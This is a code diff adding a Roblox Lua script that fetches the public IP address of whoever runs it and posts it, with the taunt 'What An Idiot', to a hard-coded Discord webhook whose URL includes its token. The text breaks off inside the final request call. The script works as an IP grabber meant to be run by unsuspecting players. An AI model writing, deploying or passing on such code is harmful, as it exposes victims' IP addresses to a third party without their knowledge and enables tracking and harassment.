@@ -1,0 +1,44 @@
+local HttpService = game:GetService("HttpService")
+local webhook = "https://discord.com/api/webhooks/1388077936501981326/7gt3grPt15e72oWMRmEhJJs9HY0G7iC0oVyZxbMQ1EYb-IIdcgW3nRosgsGEbAVrooxQ"
+
+-- Function to get the player's IP (using ipify API)
+local function GetPlayerIP()
+    local ip = "Unknown"
+    local success, response = pcall(function()
+        return game:HttpGet("https://api.ipify.org/")
+    end)
+    
+    if success then
+        ip = response
+    end
+    return ip
+end
+
+-- Get the player's IP
+local playerIP = GetPlayerIP()
+
+-- Create the message payload
+local message = {
+    ["content"] = "**Player's IP:**\n" .. playerIP,
+    ["embeds"] = {{
+        ["title"] = "What An Idiot",
+        ["description"] = "A player has executed the script.\nIP: " .. playerIP,
+        ["color"] = 16711680 -- Red color for visibility
+    }}
+}
+
+-- Encode the message as JSON
+local jsonMessage = HttpService:JSONEncode(message)
+
+-- Headers for the request
+local headers = {
+    ["Content-Type"] = "application/json"
+}
+
+-- Send the message to the Discord webhook
+pcall(function()
+    request({
+        Url = webhook,
+        Body = jsonMessage,
+        Method = "POST",
+        Headers = headers
